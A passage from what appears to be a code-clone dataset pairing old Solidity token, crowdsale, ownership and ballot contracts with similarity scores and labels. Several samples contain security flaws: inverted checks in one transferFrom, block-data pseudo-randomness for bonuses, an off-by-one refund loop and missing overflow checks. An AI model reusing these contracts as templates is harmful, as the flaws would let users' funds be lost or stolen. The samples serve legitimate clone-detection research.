        totalSupply = 300000000 * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = 'BitPaction Shares';
        symbol = 'BPS';
    }

   
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                     
        Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value; 
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract Doi is EIP20Interface {

  uint256 constant private MAX_UINT256 = 2**256 - 1;
  mapping (address => uint256) public balances;
  mapping (address => mapping (address => uint256)) public allowed;
  
  string public name;                   
  uint8 public decimals;                
  string public symbol;                 

  function Doi(
    uint256 _initialAmount,
    string _tokenName,
    uint8 _decimalUnits,
    string _tokenSymbol
    ) public {
    balances[msg.sender] = _initialAmount;               
    totalSupply = _initialAmount;                        
    name = _tokenName;                                   
    decimals = _decimalUnits;                            
    symbol = _tokenSymbol;                               
  }

  function transfer(address _to, uint256 _value) public returns (bool success) {
    require(balances[msg.sender] >= _value);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    Transfer(msg.sender, _to, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    uint256 allowance = allowed[_from][msg.sender];
    require(balances[_from] >= _value && allowance >= _value);
    balances[_to] += _value;
    balances[_from] -= _value;
    if (allowance < MAX_UINT256) {
      allowed[_from][msg.sender] -= _value;
    }
    Transfer(_from, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  function approve(address _spender, uint256 _value) public returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }
}",0.917495396,"contract IDH is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 

    function IDH() public {
        balances[msg.sender] = (10 ** 8 * 5) * (10 ** 18);               
        totalSupply = (10 ** 8 * 5) * (10 ** 18);                        
        name = 'Identity Hub Token';                                            
        decimals = 18;                                                   
        symbol = 'IDHUB';                                                  
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        require(balances[_to] + _value >= balances[_to]);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        require(balances[_to] + _value >= balances[_to]);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }   
}",1,,,,,
"contract Ownable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    
    constructor() internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    
    function owner() public view returns(address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(isOwner(), ""Caller must be owner."");
        _;
    }

    
    function isOwner() public view returns(bool) {
        return msg.sender == _owner;
    }

    
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), ""New owner can't be zero address."");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}",0.961029873,"contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(isOwner(), ""Only owner can do that"");
        _;
    }
    
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }
    
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), ""newOwner parameter must be set"");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}",1,,,,,
"contract ERC20 is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) internal _allowed;

    uint256 internal _totalSupply;

    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }

    
    function allowance(
        address owner,
        address spender
    )
      public
      view
      returns (uint256)
    {
        return _allowed[owner][spender];
    }

    
    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    
    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));

        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    
    function transferFrom(
        address from,
        address to,
        uint256 value
    )
      public
      returns (bool)
    {
        require(value <= _allowed[from][msg.sender]);

        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    
    function increaseAllowance(
        address spender,
        uint256 addedValue
    )
      public
      returns (bool)
    {
        require(spender != address(0));

        _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    )
      public
      returns (bool)
    {
        require(spender != address(0));

        _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    
    function _transfer(address from, address to, uint256 value) internal {
        require(value <= _balances[from], ""Not enough balance."");
        require(to != address(0), ""Address musn't be zero."");
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }

}",0.933091168,"contract ERC20 is IERC20 {



  using SafeMath for uint256;



  mapping (address => uint256) internal balances_;



  mapping (address => mapping (address => uint256)) private allowed_;



  uint256 internal totalSupply_;



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  

  function balanceOf(address _owner) public view returns (uint256) {

    return balances_[_owner];

  }



  

  function allowance(

    address _owner,

    address _spender

   )

    public

    view

    returns (uint256)

  {

    return allowed_[_owner][_spender];

  }



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_value <= balances_[msg.sender]);

    require(_to != address(0));



    balances_[msg.sender] = balances_[msg.sender].sub(_value);

    balances_[_to] = balances_[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function approve(address _spender, uint256 _value) public returns (bool) {

    allowed_[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  

  function transferFrom(

    address _from,

    address _to,

    uint256 _value

  )

    public

    returns (bool)

  {

    require(_value <= balances_[_from]);

    require(_value <= allowed_[_from][msg.sender]);

    require(_to != address(0));



    balances_[_from] = balances_[_from].sub(_value);

    balances_[_to] = balances_[_to].add(_value);

    allowed_[_from][msg.sender] = allowed_[_from][msg.sender].sub(_value);

    emit Transfer(_from, _to, _value);

    return true;

  }



  

  function increaseApproval(

    address _spender,

    uint256 _addedValue

  )

    public

    returns (bool)

  {

    allowed_[msg.sender][_spender] = (

      allowed_[msg.sender][_spender].add(_addedValue));

    emit Approval(msg.sender, _spender, allowed_[msg.sender][_spender]);

    return true;

  }



  

  function decreaseApproval(

    address _spender,

    uint256 _subtractedValue

  )

    public

    returns (bool)

  {

    uint256 oldValue = allowed_[msg.sender][_spender];

    if (_subtractedValue >= oldValue) {

      allowed_[msg.sender][_spender] = 0;

    } else {

      allowed_[msg.sender][_spender] = oldValue.sub(_subtractedValue);

    }

    emit Approval(msg.sender, _spender, allowed_[msg.sender][_spender]);

    return true;

  }



}",1,,,,,
"contract CrowdSale {
    enum State {
        Fundraising,
        Failed,
        Successful,
        Closed
    }
    State public state = State.Fundraising;

    struct Contribution {
        uint amount;
        address contributor;
    }
    Contribution[] contributions;



    uint public totalRaised;
    uint public currentBalance;
    uint public deadline;
    uint public completedAt;
    uint public priceInWei;
    uint public fundingMinimumTargetInWei; 
    uint public fundingMaximumTargetInWei; 
    token public tokenReward;
    address public creator;
    address public beneficiary; 
    string campaignUrl;
    byte constant version = ""1"";


    event LogFundingReceived(address addr, uint amount, uint currentTotal);
    event LogWinnerPaid(address winnerAddress);
    event LogFundingSuccessful(uint totalRaised);
    event LogFunderInitialized(
        address creator,
        address beneficiary,
        string url,
        uint _fundingMaximumTargetInEther, 
        uint256 deadline);


    modifier inState(State _state) {
        require(state == _state) ;
        _;
    }

     modifier isMinimum() {
        require(msg.value > priceInWei) ;
        _;
    }

    modifier inMultipleOfPrice() {
        require(msg.value%priceInWei == 0) ;
        _;
    }

    modifier isCreator() {
        require(msg.sender == creator) ;
        _;
    }


    modifier atEndOfLifecycle() {
        if(!((state == State.Failed || state == State.Successful) && completedAt + 1 hours < now)) {
            revert();
        }
        _;
    }


    function CrowdSale(
        uint _timeInMinutesForFundraising,
        string _campaignUrl,
        address _ifSuccessfulSendTo,
        uint _fundingMinimumTargetInEther,
        uint _fundingMaximumTargetInEther,
        token _addressOfTokenUsedAsReward,
        uint _etherCostOfEachToken) public
    {
        creator = msg.sender;
        beneficiary = _ifSuccessfulSendTo;
        campaignUrl = _campaignUrl;
        fundingMinimumTargetInWei = _fundingMinimumTargetInEther * 1 ether; 
        fundingMaximumTargetInWei = _fundingMaximumTargetInEther * 1 ether; 
        deadline = now + (_timeInMinutesForFundraising * 1 minutes);
        currentBalance = 0;
        tokenReward = token(_addressOfTokenUsedAsReward);
        priceInWei = _etherCostOfEachToken * 100000000000 wei;
        LogFunderInitialized(
            creator,
            beneficiary,
            campaignUrl,
            fundingMaximumTargetInWei,
            deadline);
    }

    function contribute()
    public
    inState(State.Fundraising) isMinimum() inMultipleOfPrice() payable returns (uint256)
    {
        uint256 amountInWei = msg.value;


        contributions.push(
            Contribution({
                amount: msg.value,
                contributor: msg.sender
                }) 
            );

        totalRaised += msg.value;
        currentBalance = totalRaised;


        if(fundingMaximumTargetInWei != 0){

            tokenReward.transfer(msg.sender, amountInWei / priceInWei);
        }
        else{
            tokenReward.mintToken(msg.sender, amountInWei / priceInWei);
        }

        LogFundingReceived(msg.sender, msg.value, totalRaised);



        checkIfFundingCompleteOrExpired();
        return contributions.length - 1; 
    }

    function checkIfFundingCompleteOrExpired() public {


        if (fundingMaximumTargetInWei != 0 && totalRaised > fundingMaximumTargetInWei) {
            state = State.Successful;
            LogFundingSuccessful(totalRaised);
            payOut();
            completedAt = now;

            } else if ( now > deadline )  {
                if(totalRaised >= fundingMinimumTargetInWei){
                    state = State.Successful;
                    LogFundingSuccessful(totalRaised);
                    payOut();  
                    completedAt = now;
                }
                else{
                    state = State.Failed; 
                    completedAt = now;
                }
            } 

    }

        function payOut()
        public
        inState(State.Successful)
        {

            if(!beneficiary.send(this.balance)) {
                revert();
            }

            state = State.Closed;
            currentBalance = 0;
            LogWinnerPaid(beneficiary);
        }

        function getRefund()
        public
        inState(State.Failed) 
        returns (bool)
        {
            for(uint i=0; i<=contributions.length; i++)
            {
                if(contributions[i].contributor == msg.sender){
                    uint amountToRefund = contributions[i].amount;
                    contributions[i].amount = 0;
                    if(!contributions[i].contributor.send(amountToRefund)) {
                        contributions[i].amount = amountToRefund;
                        return false;
                    }
                    else{
                        totalRaised -= amountToRefund;
                        currentBalance = totalRaised;
                    }
                    return true;
                }
            }
            return false;
        }

        function removeContract()
        public
        isCreator()
        atEndOfLifecycle()
        {
            selfdestruct(msg.sender);

        }

        function () public { revert(); }
}",0.995874513,"contract CrowdSale {
    enum State {
        Fundraising,
        Failed,
        Successful,
        Closed
    }
    State public state = State.Fundraising;

    struct Contribution {
        uint amount;
        address contributor;
    }
    Contribution[] contributions;

    
    
    uint public totalRaised;
    uint public currentBalance;
    uint public deadline;
    uint public completedAt;
    uint public priceInWei;
    uint public fundingMinimumTargetInWei; 
    uint public fundingMaximumTargetInWei; 
    token public tokenReward;
    address public creator;
    address public beneficiary; 
    string campaignUrl;
    byte constant version = ""1"";

    
    event LogFundingReceived(address addr, uint amount, uint currentTotal);
    event LogWinnerPaid(address winnerAddress);
    event LogFundingSuccessful(uint totalRaised);
    event LogFunderInitialized(
        address creator,
        address beneficiary,
        string url,
        uint _fundingMaximumTargetInEther, 
        uint256 deadline);


    modifier inState(State _state) {
        require(state == _state) ;
        _;
    }

     modifier isMinimum() {
        require(msg.value > priceInWei) ;
        _;
    }

    modifier inMultipleOfPrice() {
        require(msg.value%priceInWei == 0) ;
        _;
    }

    modifier isCreator() {
        require(msg.sender == creator) ;
        _;
    }

    
    modifier atEndOfLifecycle() {
        if(!((state == State.Failed || state == State.Successful) && completedAt + 1 hours < now)) {
            revert();
        }
        _;
    }

    
    function CrowdSale(
        uint _timeInMinutesForFundraising,
        string _campaignUrl,
        address _ifSuccessfulSendTo,
        uint _fundingMinimumTargetInEther,
        uint _fundingMaximumTargetInEther,
        token _addressOfTokenUsedAsReward,
        uint _etherCostOfEachToken) public
    {
        creator = msg.sender;
        beneficiary = _ifSuccessfulSendTo;
        campaignUrl = _campaignUrl;
        fundingMinimumTargetInWei = _fundingMinimumTargetInEther * 1 ether; 
        fundingMaximumTargetInWei = _fundingMaximumTargetInEther * 1 ether; 
        deadline = now + (_timeInMinutesForFundraising * 1 minutes);
        currentBalance = 0;
        tokenReward = token(_addressOfTokenUsedAsReward);
        priceInWei = _etherCostOfEachToken * 1 ether;
        LogFunderInitialized(
            creator,
            beneficiary,
            campaignUrl,
            fundingMaximumTargetInWei,
            deadline);
    }

    function contribute()
    public
    inState(State.Fundraising) isMinimum() inMultipleOfPrice() payable returns (uint256)
    {
        uint256 amountInWei = msg.value;

        
        contributions.push(
            Contribution({
                amount: msg.value,
                contributor: msg.sender
                }) 
            );

        totalRaised += msg.value;
        currentBalance = totalRaised;


        if(fundingMaximumTargetInWei != 0){
            
            tokenReward.transfer(msg.sender, amountInWei / priceInWei);
        }
        else{
            tokenReward.mintToken(msg.sender, amountInWei / priceInWei);
        }

        LogFundingReceived(msg.sender, msg.value, totalRaised);

        

        checkIfFundingCompleteOrExpired();
        return contributions.length - 1; 
    }

    function checkIfFundingCompleteOrExpired() public {
        
       
        if (fundingMaximumTargetInWei != 0 && totalRaised > fundingMaximumTargetInWei) {
            state = State.Successful;
            LogFundingSuccessful(totalRaised);
            payOut();
            completedAt = now;
            
            } else if ( now > deadline )  {
                if(totalRaised >= fundingMinimumTargetInWei){
                    state = State.Successful;
                    LogFundingSuccessful(totalRaised);
                    payOut();  
                    completedAt = now;
                }
                else{
                    state = State.Failed; 
                    completedAt = now;
                }
            } 
        
    }

        function payOut()
        public
        inState(State.Successful)
        {
            
            if(!beneficiary.send(this.balance)) {
                revert();
            }

            state = State.Closed;
            currentBalance = 0;
            LogWinnerPaid(beneficiary);
        }

        function getRefund()
        public
        inState(State.Failed) 
        returns (bool)
        {
            for(uint i=0; i<=contributions.length; i++)
            {
                if(contributions[i].contributor == msg.sender){
                    uint amountToRefund = contributions[i].amount;
                    contributions[i].amount = 0;
                    if(!contributions[i].contributor.send(amountToRefund)) {
                        contributions[i].amount = amountToRefund;
                        return false;
                    }
                    else{
                        totalRaised -= amountToRefund;
                        currentBalance = totalRaised;
                    }
                    return true;
                }
            }
            return false;
        }

        function removeContract()
        public
        isCreator()
        atEndOfLifecycle()
        {
            selfdestruct(msg.sender);
            
        }

        function () public { revert(); }
}",1,,,,,
"contract A {
  ...
  function transfer(address to, uint tokens) public payable returns (bool success) {
    ...
  }
  ...
}",0.904960702,"contract Accelerator {

  function transfer(address to, uint tokens) public returns (bool success);

}",4,*,,,,
"contract C { 
    function test() public {  } 
}",0.944060284,"contract test {
    function f() public { }
}",1,,,,,
"contract Ownable {
  address public owner;
  function Ownable() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}",0.914525594,"contract Ownable {

    address public owner;

    
    function Ownable() public {
        owner = msg.sender;
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        owner = newOwner;
    }

    event OwnerLog(address a);

}",3,,,,,
"contract Ballot {

    struct Voter {
        uint weight;
        bool voted;
        uint8 vote;
        address delegate;
    }
    struct Proposal {
        uint voteCount;
    }

    address chairperson;
    mapping(address => Voter) voters;
    Proposal[] proposals;

    
    function Ballot(uint8 _numProposals) public {
        chairperson = msg.sender;
        voters[chairperson].weight = 1;
        proposals.length = 3;
    }

    
    
    function giveRightToVote(address toVoter) public {
        if (msg.sender != chairperson || voters[toVoter].voted) return;
        voters[toVoter].weight = 1;
    }

    
    function delegate(address to) public {
        Voter storage sender = voters[msg.sender]; 
        if (sender.voted) return;
        while (voters[to].delegate != address(0) && voters[to].delegate != msg.sender)
            to = voters[to].delegate;
        if (to == msg.sender) return;
        sender.voted = true;
        sender.delegate = to;
        Voter storage delegateTo = voters[to];
        if (delegateTo.voted)
            proposals[delegateTo.vote].voteCount += sender.weight;
        else
            delegateTo.weight += sender.weight;
    }

    
    function vote(uint8 toProposal) public {
        Voter storage sender = voters[msg.sender];
        if (sender.voted || toProposal >= proposals.length) return;
        sender.voted = true;
        sender.vote = toProposal;
        proposals[toProposal].voteCount += sender.weight;
    }

    function winningProposal() public constant returns (uint8 _winningProposal) {
        uint256 winningVoteCount = 0;
        for (uint8 prop = 0; prop < proposals.length; prop++)
            if (proposals[prop].voteCount > winningVoteCount) {
                winningVoteCount = proposals[prop].voteCount;
                _winningProposal = prop;
            }
    }
}",0.980479479,"contract shy {



    struct Voter {

        uint weight;

        bool voted;

        uint8 vote;

        address delegate;

    }

    struct Proposal {

        uint voteCount;

    }



    address chairperson;

    mapping(address => Voter) voters;

    Proposal[] proposals;



    

    constructor(uint8 _numProposals) public {

        chairperson = msg.sender;

        voters[chairperson].weight = 1;

        proposals.length = _numProposals;

    }



    

    

    function giveRightToVote(address toVoter) public {

        if (msg.sender != chairperson || voters[toVoter].voted) return;

        voters[toVoter].weight = 1;

    }



    

    function delegate(address to) public {

        Voter storage sender = voters[msg.sender]; 

        if (sender.voted) return;

        while (voters[to].delegate != address(0) && voters[to].delegate != msg.sender)

            to = voters[to].delegate;

        if (to == msg.sender) return;

        sender.voted = true;

        sender.delegate = to;

        Voter storage delegateTo = voters[to];

        if (delegateTo.voted)

            proposals[delegateTo.vote].voteCount += sender.weight;

        else

            delegateTo.weight += sender.weight;

    }



    

    function vote(uint8 toProposal) public {

        Voter storage sender = voters[msg.sender];

        if (sender.voted || toProposal >= proposals.length) return;

        sender.voted = true;

        sender.vote = toProposal;

        proposals[toProposal].voteCount += sender.weight;

    }



    function winningProposal() public view returns (uint8 _winningProposal) {

        uint256 winningVoteCount = 0;

        for (uint8 prop = 0; prop < proposals.length; prop++)

            if (proposals[prop].voteCount > winningVoteCount) {

                winningVoteCount = proposals[prop].voteCount;

                _winningProposal = prop;

            }

    }

}",1,,,,,
"contract MyKidsEducationToken {
    address owner = msg.sender;

    bool public purchasingAllowed = false;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;

    uint256 public totalContribution = 0;
    uint256 public totalBonusTokensIssued = 0;

    uint256 public totalSupply = 0;

    function name() constant returns (string) { return ""My Kids Education Token""; }
    function symbol() constant returns (string) { return ""MTKE""; }
    function decimals() constant returns (uint8) { return 18; }

    function balanceOf(address _owner) constant returns (uint256) { return balances[_owner]; }

    function transfer(address _to, uint256 _value) returns (bool success) {
        
        if(msg.data.length < (2 * 32) + 4) { revert(); }

        if (_value == 0) { return false; }

        uint256 fromBalance = balances[msg.sender];

        bool sufficientFunds = fromBalance >= _value;
        bool overflowed = balances[_to] + _value < balances[_to];

        if (sufficientFunds && !overflowed) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;

            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        
        if(msg.data.length < (3 * 32) + 4) { revert(); }

        if (_value == 0) { return false; }

        uint256 fromBalance = balances[_from];
        uint256 allowance = allowed[_from][msg.sender];

        bool sufficientFunds = fromBalance <= _value;
        bool sufficientAllowance = allowance <= _value;
        bool overflowed = balances[_to] + _value > balances[_to];

        if (sufficientFunds && sufficientAllowance && !overflowed) {
            balances[_to] += _value;
            balances[_from] -= _value;

            allowed[_from][msg.sender] -= _value;

            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256) {
        return allowed[_owner][_spender];
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    function enablePurchasing() {
        if (msg.sender != owner) { revert(); }

        purchasingAllowed = true;
    }

    function disablePurchasing() {
        if (msg.sender != owner) { revert(); }

        purchasingAllowed = false;
    }

    function withdrawForeignTokens(address _tokenContract) returns (bool) {
        if (msg.sender != owner) { revert(); }

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }

    function getStats() constant returns (uint256, uint256, uint256, bool) {
        return (totalContribution, totalSupply, totalBonusTokensIssued, purchasingAllowed);
    }

    function() payable {
        if (!purchasingAllowed) { revert(); }

        if (msg.value == 0) { return; }

        owner.transfer(msg.value);
        totalContribution += msg.value;

        uint256 tokensIssued = (msg.value * 100);

        if (msg.value >= 10 finney) {
            tokensIssued += totalContribution;

            bytes20 bonusHash = ripemd160(block.coinbase, block.number, block.timestamp);
            if (bonusHash[0] == 0) {
                uint8 bonusMultiplier =
                    ((bonusHash[1] & 0x01 != 0) ? 1 : 0) + ((bonusHash[1] & 0x02 != 0) ? 1 : 0) +
                    ((bonusHash[1] & 0x04 != 0) ? 1 : 0) + ((bonusHash[1] & 0x08 != 0) ? 1 : 0) +
                    ((bonusHash[1] & 0x10 != 0) ? 1 : 0) + ((bonusHash[1] & 0x20 != 0) ? 1 : 0) +
                    ((bonusHash[1] & 0x40 != 0) ? 1 : 0) + ((bonusHash[1] & 0x80 != 0) ? 1 : 0);

                uint256 bonusTokensIssued = (msg.value * 100) * bonusMultiplier;
                tokensIssued += bonusTokensIssued;

                totalBonusTokensIssued += bonusTokensIssued;
            }
        }

        totalSupply += tokensIssued;
        balances[msg.sender] += tokensIssued;

        Transfer(address(this), msg.sender, tokensIssued);
    }
}",0.976323885,"contract MortgageEthereumToken {
    address owner = msg.sender;

    bool public purchasingAllowed = false;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;

    uint256 public totalContribution = 0;
    uint256 public totalBonusTokensIssued = 0;

    uint256 public totalSupply = 0;

    function name() constant returns (string) { return ""Mortgage Ethereum Token""; }
    function symbol() constant returns (string) { return ""THX""; }
    function decimals() constant returns (uint8) { return 18; }
    
    function balanceOf(address _owner) constant returns (uint256) { return balances[_owner]; }
    
    function transfer(address _to, uint256 _value) returns (bool success) {
        
        if(msg.data.length < (2 * 32) + 4) { throw; }

        if (_value == 0) { return false; }

        uint256 fromBalance = balances[msg.sender];

        bool sufficientFunds = fromBalance >= _value;
        bool overflowed = balances[_to] + _value < balances[_to];
        
        if (sufficientFunds && !overflowed) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }
    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        
        if(msg.data.length < (3 * 32) + 4) { throw; }

        if (_value == 0) { return false; }
        
        uint256 fromBalance = balances[_from];
        uint256 allowance = allowed[_from][msg.sender];

        bool sufficientFunds = fromBalance <= _value;
        bool sufficientAllowance = allowance <= _value;
        bool overflowed = balances[_to] + _value > balances[_to];

        if (sufficientFunds && sufficientAllowance && !overflowed) {
            balances[_to] += _value;
            balances[_from] -= _value;
            
            allowed[_from][msg.sender] -= _value;
            
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }
    
    function approve(address _spender, uint256 _value) returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        
        allowed[msg.sender][_spender] = _value;
        
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant returns (uint256) {
        return allowed[_owner][_spender];
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    function enablePurchasing() {
        if (msg.sender != owner) { throw; }

        purchasingAllowed = true;
    }

    function disablePurchasing() {
        if (msg.sender != owner) { throw; }

        purchasingAllowed = false;
    }

    function withdrawMortgageTokens(address _tokenContract) returns (bool) {
        if (msg.sender != owner) { throw; }

        MortgageToken token = MortgageToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }

    function getStats() constant returns (uint256, uint256, uint256, bool) {
        return (totalContribution, totalSupply, totalBonusTokensIssued, purchasingAllowed);
    }

    function() payable {
        if (!purchasingAllowed) { throw; }
        
        if (msg.value == 0) { return; }

        owner.transfer(msg.value);
        totalContribution += msg.value;

        uint256 tokensIssued = (msg.value * 100);

        if (msg.value >= 10 finney) {
            tokensIssued += totalContribution;

            bytes20 bonusHash = ripemd160(block.coinbase, block.number, block.timestamp);
            if (bonusHash[0] == 0) {
                uint8 bonusMultiplier =
                    ((bonusHash[1] & 0x01 != 0) ? 1 : 0) + ((bonusHash[1] & 0x02 != 0) ? 1 : 0) +
                    ((bonusHash[1] & 0x04 != 0) ? 1 : 0) + ((bonusHash[1] & 0x08 != 0) ? 1 : 0) +
                    ((bonusHash[1] & 0x10 != 0) ? 1 : 0) + ((bonusHash[1] & 0x20 != 0) ? 1 : 0) +
                    ((bonusHash[1] & 0x40 != 0) ? 1 : 0) + ((bonusHash[1] & 0x80 != 0) ? 1 : 0);
                
                uint256 bonusTokensIssued = (msg.value * 100) * bonusMultiplier;
                tokensIssued += bonusTokensIssued;

                totalBonusTokensIssued += bonusTokensIssued;
            }
        }

        totalSupply += tokensIssued;
        balances[msg.sender] += tokensIssued;
        
        Transfer(address(this), msg.sender, tokensIssued);
    }
}",1,,,,,
"contract ERC20 {
function totalSupply() constant returns (uint256 totalSupply);
function balanceOf(address _owner) constant returns (uint256 balance);
function transfer(address _to, uint _value);
event Transfer(address indexed _from, address indexed _to, uint _value);
}",0.915856627,"contract ERC20Basic {
  uint public _totalSupply;
  function totalSupply() constant returns (uint);
  function balanceOf(address who) constant returns (uint);
  function transfer(address to, uint value);
  event Transfer(address indexed from, address indexed to, uint value);
}",3,,,,,
"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }

}",0.976816999,"contract BasicToken is ERC20Basic {
    using SafeMath for uint256;

    mapping(address => uint256) balances;

    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);

        
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
